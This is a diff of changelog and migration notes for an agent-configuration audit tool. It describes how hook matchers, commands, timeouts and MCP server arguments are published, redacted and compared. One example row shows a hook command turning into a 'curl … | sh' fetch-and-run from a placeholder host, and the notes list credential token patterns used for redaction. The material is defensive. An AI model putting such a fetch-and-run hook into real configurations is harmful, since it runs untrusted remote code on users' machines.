@@ -18,6 +18,21 @@ workspace too.
 `minimum_control_contract_version` stays `21`. See
 [the migration note](#unread-changed-inputs-821).
 
+Also in unreleased runtime contract v41: the host grants publish what a hook
+runs and what an MCP server is launched with (#819). Host-grants inventory, baseline and drift
+schemas move to `0.7`: a hook grant adds `handlers[]` — each handler's group
+`matcher`, its `type`, a redacted and bounded `command` summary
+(`env_keys`, `argv0`, `args`, `omitted_args`) and its `timeout` — and
+`omitted_handlers`, and an MCP server grant adds its redacted, bounded `args`
+and `omitted_args`. A hook row reads `PostToolUse: matcher Edit →
+Edit|Write|Bash` instead of `PostToolUse → PostToolUse`, and a version pin
+moving to `@latest` is an `args` difference. The members display what
+`config_sha256` already binds, so grant equality and the inventory digests
+leave them out: they move no row value, row count, verifier or capability-diff
+schema, a `0.6` baseline stays comparable with no new row or reason, and
+`audit --host --save-baseline` may replace it. `minimum_control_contract_version`
+stays `21`. See [the migration note](#hook-mcp-detail-fields-819).
+
 Also unreleased, and moving no version of its own: a Claude Code setting that
 disables prompts or approves project MCP servers carries one rating on every
 surface (#827). The `audit --host` grant, the `diff`, `verify` and `check`
@@ -58,7 +73,7 @@ now always declares its worktree snapshot, so Git configuration the worktree
 readers refuse (#813) no longer leaves a preview current. See
 [the migration note](#preview-control-currency-807).
 
-Runtime contract v40 reads the action reference each workflow step declares
+Previous runtime contract v40 reads the action reference each workflow step declares
 (#771). Host-grants inventory, baseline and drift schemas move to `0.6`, and a
 workflow grant adds `step_actions[]`: the job, the step (`id`, else `name`,
 else `steps[N]`), the declared `uses`, and its `form` — `remote`, `docker`, or
@@ -348,19 +363,54 @@ command, verdict, reader, row or control state is added.
 
 **One route moves, on `verify` and `verify --preview` alike.** `verify` without a `shipgate.yaml` returned to the setup route (`Shipgate config not found`, exit `2`) whenever neither side of the comparison held a host artifact, and that route says nothing about the change. A comparison that read no artifact but names a changed input this entry does not read, or counts one or more changed candidate inputs as not examined (`unread_candidates_not_examined` above `0`, the one place that change is mentioned), is now published instead, on the existing manifest-free host route: advisory, exit `0`, `control.state` `agent_action_required` with the `audit --host` next action that route already names. `verify --preview` runs the same comparison and moves the same way: where its next action was `initialize` (`init --write`) with `host_comparison: null`, it is now `discover` (`audit --host`) with the comparison published and the host route's headline; `control.state` stays `agent_action_required` and the exit stays `0`. That includes an agent-related workspace, such as one whose change also adds a tool: a published host comparison takes the preview route whenever one exists, exactly as it already did when the change edits a host file this entry reads, such as the root `.claude/settings.json`. A comparison that reads no artifact, names nothing and counts nothing as not examined still takes the setup route on `verify` and `initialize` on `verify --preview`, as before; so does one whose changed files could not be listed (`unread_candidates: not_examined`), which says nothing about whether a candidate changed.
 
-**What does not change.** `comparison_status`, `incomparable_reasons`, `rows` and every row value, `review`, `unchanged_limits`, every other coverage item, the inventory digests, saved host-grants baselines and drift payloads (host-grants stays `0.6`), `audit --host`, `check`'s decision, rows and text, the control envelope's `capability_rows`, and every control state, permission and next action on a comparison that reads a host artifact. The host-config and cold-start benchmark replays reproduce their run-of-record scores. `minimum_control_contract_version` stays `21`.
+**What does not change.** `comparison_status`, `incomparable_reasons`, `rows` and every row value, `review`, `unchanged_limits`, every other coverage item, the inventory digests, saved host-grants baselines and drift payloads (#821 moves no host-grants schema; #819, below, moves it to `0.7`), `audit --host`, `check`'s decision, rows and text, the control envelope's `capability_rows`, and every control state, permission and next action on a comparison that reads a host artifact. The host-config and cold-start benchmark replays reproduce their run-of-record scores. `minimum_control_contract_version` stays `21`.
 
 **Compatibility.** `coverage` and its items are closed objects, so a reader validating against the published [`docs/verifier-schema.v0.20.json`](docs/verifier-schema.v0.20.json) rejects a `0.21` artifact's new members; that schema stays frozen. The current reader reads a `0.20` artifact as `0.21` with `unread_candidates: null`, which is what that build knew, and refuses one that claims a `changed_not_read` item, a `candidate`, `read_sources_only: false` or either `unread_candidates` member. A `diff --json` consumer sees `capability_diff_schema_version: "0.4"`. A consumer switching on `coverage.items[].status` should treat an unknown status as a change it must read, not as no change.
+
+<a id="hook-mcp-detail-fields-819"></a>
+
+## Migration Note: Unreleased — hook matcher, command and timeout, and MCP launch arguments (host-grants `0.7`, contract v41, #819)
+
+A hook row read `PostToolUse → PostToolUse` whether the edit was to the hook's
+matcher, its command or its timeout, and an MCP server whose version pin moved
+to `@latest` read as a change "in a detail this output does not show": the
+grants carried none of it, and only `config_sha256` saw the edit. Host-grants
+inventory, baseline and drift schemas `0.7` add members to two grant kinds.
+Both are always present in a `0.7` grant, so their absence marks a grant an
+earlier schema read:
+
+```json
+{"kind": "hook", "event": "PostToolUse",
+ "handlers": [{"matcher": "Edit|Write", "type": "command",
+               "command": {"env_keys": ["API_KEY"], "argv0": "bin/lint.sh", "args": ["--fix"], "omitted_args": 0},
+               "timeout": 30}],
+ "omitted_handlers": 0}
+{"kind": "mcp_server", "server": "docs", "args": ["-y", "example-mcp-server@1.2.3"], "omitted_args": 0}
+```
+
+- **What is read.** For a hook, each handler under the event, in file order: its group's `matcher` (`null` when the group declares none), its `type`, a summary of its `command` string and its `timeout` (the number as declared, or the value's text when it is not one). Other handler settings, such as `async`, and a `prompt` handler's prompt are not published. The summary splits the command into words at whitespace outside quotes, removing the quotes and keeping a backslash as written, which is display and not a claim about how a host runs the command or what it does: leading `NAME=value` assignments are named in `env_keys` with their values dropped, the next word is `argv0`, and at most eight words follow it in `args`. For an MCP server, the declared `args`, at most twelve: `[]` when none are declared and `null` when `args` is not a list. A version pin is the argument it is. `endpoint` is unchanged, still the command's name.
+- **Redaction.** Every published word passes through the #802 label redaction: known token shapes (`ghp_…`, `AKIA…`, `sk-…`, `xoxb-…`, JWTs, database URLs with credentials), header, `Bearer` and credential assignments, URLs reduced to scheme and host with `/<redacted-path>` and no query, and `scheme://` userinfo. Then `<redacted>` replaces the value after a credential-named flag (`--token X`, `--api-key=X`, `--access-token X`: a flag whose name is, or ends in, a credential word such as `token`, `secret`, `password` or `apikey`), the value of an `env`-style `NAME=value` word with an upper-case name, and a word that reads like a generated key (32 or more hex digits, or 20 or more base64 characters of two classes with high entropy or many letter-digit switches). A hook command's leading assignments keep only their names, in `env_keys`, whatever their case. A path under the reading user's home is written from `~`. A short or word-like secret passed positionally, such as `hunter2`, matches none of these rules and is published as written.
+- **Bounds.** A word longer than 80 characters, or a matcher longer than 120, is cut and ends in `…`. `omitted_args` and `omitted_handlers` count the words, arguments and handlers past their bound; at most sixteen handlers per event are listed.
+- **Shape.** Only the documented hooks shape is read: a list of matcher groups, each an object with a `hooks` list of objects whose `command`, when present, is a string. Anything else publishes `handlers: null`, and its row reads `PostToolUse: matcher, command and timeout not shown: the declaration is not a list of matcher groups whose hooks are objects`. A plugin-selected hook (#714) and a Codex `.codex/hooks.json` hook publish the handlers their file declares and keep their loading basis: `access`, `risk`, the row's `why` and the expansion signal are unchanged.
+- **Display only.** The new members are a redacted, bounded projection of the configuration `config_sha256` is computed from. Grant equality and every inventory digest (a baseline's `inventory_sha256`, the drift and comparison digests) leave them out, so a change is a row exactly when it was one before, and redacting a value never hides one: rotating a positional token is still a row, which says the change is in a redacted or shortened argument. Because a baseline's digest does not cover them, a hand edit to a baseline's copy is not detected; no comparison, row or route reads that copy.
+- **The rows.** A changed hook names each differing field with its before and after, `PostToolUse: matcher Edit → Edit|Write|Bash`, `PostToolUse: command bin/lint.sh → curl -s https://example.invalid/<redacted-path> | sh`, `PostToolUse: timeout 10 → 600`; with several handlers, which one (`PreToolUse: handler 2 timeout 5 → 50`); a handler only one side declares as `+handler (…)` or `-handler (…)`, since nothing establishes which handler another replaced; and a reorder as `the same handlers in a different order`. An added or removed hook names its handlers, `SessionEnd (command bin/cleanup.sh)`. A changed MCP server adds `args -y example-mcp-server@1.2.3 → -y example-mcp-server@latest` beside its other published facts, and an added one `docs (command name npx; args -y example-mcp-server@2.0.0)`. When no published field differs, a hook reads `no difference in the matcher, type, command summary or timeout; the change is in a detail this output does not show, such as a redacted or shortened word or another hook setting`, and a command server `no difference in the command name npx, arguments, env key names or header key names; the change is in a detail this output does not show, such as the command's path, a redacted or shortened argument, or another setting`. No entry names a direction (#820). The entry is printed by `diff`, `verify` text, the PR comment and `check` text, and published as `review.changes[].change` in `diff --json` and `verifier.json`. Every row value and the row count are unchanged; `check`'s boundary result and the control envelope's `capability_rows` carry rows alone, as before.
+
+**Compatibility.**
+- **A committed `0.6` baseline** stays comparable. Drift reads its grants without the new members and reports what contract v40 reported, with no new row, expansion signal or incomparable reason. `audit --host --save-baseline` may now replace it and reports `status: updated`, with no move-aside step. A baseline older than `0.6` is still refused with `unsupported_baseline_schema`, as the [#771 note](#workflow-step-action-references-contract-v40-771) describes.
+- **Git-backed `diff`, `check` and manifest-free `verify`** read both sides with the current reader and need no migration.
+- **Validators pinned to the `0.6` schemas** reject a `0.7` inventory, baseline or drift payload. The `0.6` schema files stay published.
+- **Verifier `0.21`, capability diff `0.4` (both moved by #821 in the same contract), `shipgate.agent_boundary_result/v3` and `minimum_control_contract_version` `21`** do not move for it.
 
 <a id="claude-setting-ratings-827"></a>
 
 ## Migration Note: Unreleased — one rating per Claude Code setting (#827)
 
 This change moves no version of its own: no schema, member, check id or
-`minimum_control_contract_version` moves, and host-grants stays `0.6`, as
-shipped in 1.1.0. The capability diff `0.4`, verifier `0.21` and runtime
-contract `41` of the unreleased tree are #821's
-([migration note](#unread-changed-inputs-821)), not this change's. What moves
+`minimum_control_contract_version` moves for it, and every field it changes is
+one host-grants `0.6` already carried as shipped in 1.1.0. The capability diff
+`0.4`, verifier `0.21` and runtime contract `41` of the unreleased tree are
+#821's ([migration note](#unread-changed-inputs-821)), and host-grants `0.7`
+is #819's ([migration note](#hook-mcp-detail-fields-819)), not this change's. What moves
 is the value of existing fields for the Claude Code settings the host inventory
 publishes as `permission_mode` grants. One table, `core/host_settings.py`, now
 rates each value, and the grant's `access` and `risk`, a row's `severity`,
